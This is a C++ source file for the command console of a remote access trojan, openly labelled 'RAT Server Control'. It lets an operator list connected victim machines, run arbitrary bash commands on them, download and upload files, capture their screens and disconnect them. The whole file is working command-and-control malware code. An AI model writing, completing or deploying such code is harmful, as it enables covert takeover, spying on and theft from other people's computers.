#include "ServerCommandController.hpp"
#include "ServerManager.hpp"
#include "ServerLogController.hpp"
#include "ServerFileController.hpp"
#include "Utils/Base64.hpp"
#include <iostream>
#include <sstream>
#include <fstream>
#include <chrono>
#include <termios.h>
#include "Utils/TCPSocket.hpp"
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstdlib>
#include <nlohmann/json.hpp>

namespace Server {

ServerCommandController::ServerCommandController(ServerManager *manager) : IController(manager), manager_(manager) {}
ServerCommandController::~ServerCommandController() { stop(); }

void ServerCommandController::start() {
    if (running_) return;
    running_ = true;

    
    if (isatty(STDIN_FILENO)) {
        stdinThread_ = std::make_unique<std::thread>(&ServerCommandController::stdinLoop, this);
    }
}

void ServerCommandController::handle(const nlohmann::json &packet) {
    
    std::lock_guard<std::mutex> lock(bashMtx_);
    bashResponses_.push(packet);
}



pid_t ServerCommandController::spawnTerminal(const std::string &innerCmd) {
    auto which_ok = [](const char *name)->bool {
        std::string cmd = std::string("which ") + name + " >/dev/null 2>&1";
        return std::system(cmd.c_str()) == 0;
    };

    std::string prog;
    if (which_ok("qterminal")) prog = "qterminal";
    else if (which_ok("xfce4-terminal")) prog = "xfce4-terminal";
    else if (which_ok("gnome-terminal")) prog = "gnome-terminal";
    else if (which_ok("konsole")) prog = "konsole";
    else if (which_ok("tilix")) prog = "tilix";
    else if (which_ok("alacritty")) prog = "alacritty";
    else if (which_ok("kitty")) prog = "kitty";
    else if (which_ok("xterm")) prog = "xterm";
    else if (which_ok("tmux")) prog = "tmux";
    else return -1;

    if (prog == "tmux") {
        std::string s = std::string("tmux new-session -d -s rat_server '") + innerCmd + "'";
        int rc = std::system(s.c_str());
        return rc == 0 ? 0 : -1;
    }

    pid_t pid = fork();
    if (pid < 0) return -1;
    if (pid == 0) {
        setsid();
        
        int devnull = open("/dev/null", O_WRONLY);
        if (devnull != -1) {
            dup2(devnull, STDOUT_FILENO);
            dup2(devnull, STDERR_FILENO);
            close(devnull);
        }
        
        if (prog == "qterminal") {
            execlp("qterminal", "qterminal", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "xfce4-terminal") {
            execlp("xfce4-terminal", "xfce4-terminal", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "gnome-terminal") {
            execlp("gnome-terminal", "gnome-terminal", "--", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "konsole") {
            execlp("konsole", "konsole", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "tilix") {
            execlp("tilix", "tilix", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "alacritty") {
            execlp("alacritty", "alacritty", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "kitty") {
            execlp("kitty", "kitty", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        } else if (prog == "xterm") {
            execlp("xterm", "xterm", "-e", "bash", "-c", innerCmd.c_str(), (char *)NULL);
        }
        _exit(127);
    }

    return pid;
}

std::string ServerCommandController::processLine(const std::string &line) {
    std::istringstream iss(line);
    std::string cmd; iss >> cmd;
    std::string reply;
    if (cmd == "help") {
        return handleHelp();
    } else if (cmd == "list") {
        return handleList();
    } else if (cmd == "choose") {
        std::string name; iss >> name;
        return handleChoose(name);
    } else if (cmd == "kill") {
        std::string name; iss >> name;
        return handleKill(name);
    } else if (cmd == "killall") {
        return handleKillAll();
    } else if (cmd == "bash") {
        std::string name; iss >> name;
        std::string rest;
        std::getline(iss, rest);
        if (!rest.empty() && rest.front() == ' ') rest.erase(0,1);
        return handleBash(name, rest);
    } else if (cmd == "download") {
        std::string arg1, arg2, arg3;
        iss >> arg1 >> arg2 >> arg3;
        std::string name, remotePath, localPath;
        if (manager_->hasClient(arg1)) {
            name = arg1;
            remotePath = arg2;
            localPath = arg3.empty() ? "." : arg3;
        } else {
            name = "";
            remotePath = arg1;
            localPath = arg2.empty() ? "." : arg2;
        }
        std::string targetClient = name.empty() ? selectedClient_ : name;
        ServerFileController fileCtrl(manager_);
        return fileCtrl.handleDownload(targetClient, remotePath, localPath);
    } else if (cmd == "upload") {
        std::string arg1, arg2, arg3;
        iss >> arg1 >> arg2 >> arg3;
        std::string name, localPath, remotePath;
        if (manager_->hasClient(arg1)) {
            name = arg1;
            localPath = arg2;
            remotePath = arg3.empty() ? "." : arg3;
        } else {
            name = "";
            localPath = arg1;
            remotePath = arg2.empty() ? "." : arg2;
        }
        std::string targetClient = name.empty() ? selectedClient_ : name;
        ServerFileController fileCtrl(manager_);
        return fileCtrl.handleUpload(targetClient, localPath, remotePath);
    } else if (cmd == "screenshot") {
        std::string name; iss >> name;
        return handleScreenshot(name);
    } else if (cmd == "quit") {
        return handleQuit();
    } else if (cmd == "showlogs") {
        return handleShowLogs();
    }
    return std::string("Unknown command\n");
}

std::string ServerCommandController::handleList() {
    if (!manager_) return "Error\n";
    auto clients = manager_->listClients();
    if (clients.empty()) return "No clients\n";
    std::string r = "Clients:\n";
    for (auto &c : clients) {
        r += "  - " + c + " (" + manager_->getClientIP(c) + ")\n";
    }
    return r;
}

std::string ServerCommandController::handleHelp() {
    std::string h;
    h += "\nCommands:\n";
    h += "  list, choose <client>, kill [client], killall\n";
    h += "  bash [client] <cmd>, screenshot [client]\n";
    h += "  download [client] <remote> [local]\n";
    h += "  upload [client] <local> [remote]\n";
    h += "  showlogs, quit\n";
    return h;
}

std::string ServerCommandController::handleChoose(const std::string &name) {
    if (!manager_) return "Manager not available\n";
    if (name.empty()) return "Invalid client name\n";
    if (name.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Invalid characters in client name\n";
    }
    if (manager_->hasClient(name)) {
        selectedClient_ = name;
        return std::string("Selected client: ") + name + "\n";
    }
    return std::string("No such client\n");
}

std::string ServerCommandController::handleKill(const std::string &name) {
    if (!manager_) return "Error: Manager not available\n";
    
    std::string targetClient = name.empty() ? selectedClient_ : name;
    
    if (targetClient.empty()) {
        return "Error: No client specified and no client selected\n";
    }
    
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) {
        return "Error: Invalid characters in client name\n";
    }
    
    
    if (manager_->hasClient(targetClient)) {
        nlohmann::json killCmd{{"controller", "kill"}};
        manager_->sendRequest(targetClient, killCmd);
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
    
    
    if (manager_->removeClient(targetClient)) {
        if (targetClient == selectedClient_) selectedClient_.clear();
        return "OK\n";
    }
    return "Not found\n";
}

std::string ServerCommandController::handleKillAll() {
    if (!manager_) return "Error\n";
    auto clients = manager_->listClients();
    if (clients.empty()) return "No clients\n";
    
    nlohmann::json killCmd{{"controller", "kill"}};
    for (const auto &c : clients) manager_->sendRequest(c, killCmd);
    std::this_thread::sleep_for(std::chrono::milliseconds(300));
    
    int n = 0;
    for (const auto &c : clients) if (manager_->removeClient(c)) n++;
    selectedClient_.clear();
    return "Disconnected " + std::to_string(n) + " client(s)\n";
}

std::string ServerCommandController::handleBash(const std::string &name, const std::string &cmd) {
    if (!manager_) return "Error\n";
    
    std::string targetClient, command;
    if (name.empty()) {
        if (selectedClient_.empty()) return "No client\n";
        targetClient = selectedClient_;
        command = cmd;
    } else if (manager_->hasClient(name)) {
        targetClient = name;
        command = cmd;
    } else {
        if (selectedClient_.empty()) return "Not found\n";
        targetClient = selectedClient_;
        command = name + (cmd.empty() ? "" : " " + cmd);
    }
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) return "Invalid\n";
    if (command.empty()) return "Empty\n";
    
    nlohmann::json req{{"controller", "bash"}, {"cmd", command}};
    if (!manager_->sendRequest(targetClient, req)) return "Failed\n";
    
    nlohmann::json resp;
    if (manager_->receiveResponse(targetClient, resp, 5000)) {
        if (resp.contains("out") && resp["out"].is_string()) {
            return resp["out"].get<std::string>();
        }
    }
    return "No response\n";
}

std::string ServerCommandController::handleScreenshot(const std::string &name) {
    if (!manager_) return "Error\n";
    std::string targetClient;
    if (name.empty()) {
        if (selectedClient_.empty()) return "No client\n";
        targetClient = selectedClient_;
    } else if (manager_->hasClient(name)) {
        targetClient = name;
    } else {
        return "Not found\n";
    }
    
    if (targetClient.find_first_of(";&|`$()<>\\\"'") != std::string::npos) return "Invalid\n";
    
    nlohmann::json req{{"controller", "screenshot"}, {"action", "take"}};
    if (!manager_->sendRequest(targetClient, req)) return "Failed\n";
    
    nlohmann::json resp;
    if (!manager_->receiveResponse(targetClient, resp, 10000)) return "Timeout\n";
    if (!resp.contains("success") || !resp["success"].get<bool>()) return "Failed\n";
    if (!resp.contains("data")) return "No data\n";
    
    std::string img = Utils::base64_decode(resp["data"].get<std::string>());
    
    auto t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::string fn = "/tmp/ss_" + targetClient + "_" + std::to_string(t) + ".png";
    std::ofstream of(fn, std::ios::binary);
    if (!of) return "Save failed\n";
    of.write(img.data(), img.size());
    of.close();
    system(("xdg-open '" + fn + "' 2>/dev/null &").c_str());
    return "OK\n";
}

bool ServerCommandController::popBashResponse(nlohmann::json &out, int timeoutMs) {
    auto start = std::chrono::steady_clock::now();
    while (true) {
        {
            std::lock_guard<std::mutex> lock(bashMtx_);
            if (!bashResponses_.empty()) {
                out = bashResponses_.front();
                bashResponses_.pop();
                return true;
            }
        }
        
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - start).count();
        if (elapsed >= timeoutMs) return false;
        
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
}

std::string ServerCommandController::handleQuit() {
    running_ = false;
    if (manager_) {
        manager_->stop();
        std::cout << "\nServer shutting down..." << std::endl;
    }
    std::exit(0);
    return std::string();
}

std::string ServerCommandController::handleShowLogs() {
    auto *logController = dynamic_cast<ServerLogController*>(
        manager_->getSystemController("log"));
    
    if (!logController) {
        return "Error: Log controller not available\n";
    }
    
    std::string logPath = manager_->logPath();
    if (logPath.empty()) {
        logPath = "/tmp/rat_server.log";
    }
    
    
    std::string cmd = "tail -F " + logPath + "; exec bash";
    pid_t pid = spawnTerminal(cmd);
    
    if (pid == -1) {
        return "Error: Could not launch terminal emulator\n" +
               std::string("Log file: ") + logPath + "\n" +
               "To view manually: tail -F " + logPath + "\n";
    }
    
    if (pid == 0) {
        return "Launched log viewer in tmux session\n";
    }
    
    return "Launched log viewer in terminal (PID: " + std::to_string(pid) + ")\n";
}



void ServerCommandController::stdinLoop() {
    std::string line;
    std::cout << "\n=== RAT Server Control ===" << std::endl;
    std::cout << "Type 'help' for available commands\n" << std::endl;
    
    while (running_) {
        if (!selectedClient_.empty()) {
            std::cout << "[" << selectedClient_ << "] > " << std::flush;
        } else {
            std::cout << "\n> " << std::flush;
        }
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;
        
        std::string reply = processLine(line);
        if (!reply.empty()) {
            std::cout << reply << std::flush;
        }
    }
}

void ServerCommandController::stop() {
    if (!running_) return;
    running_ = false;
    if (stdinThread_ && stdinThread_->joinable()) stdinThread_->join();
}

}
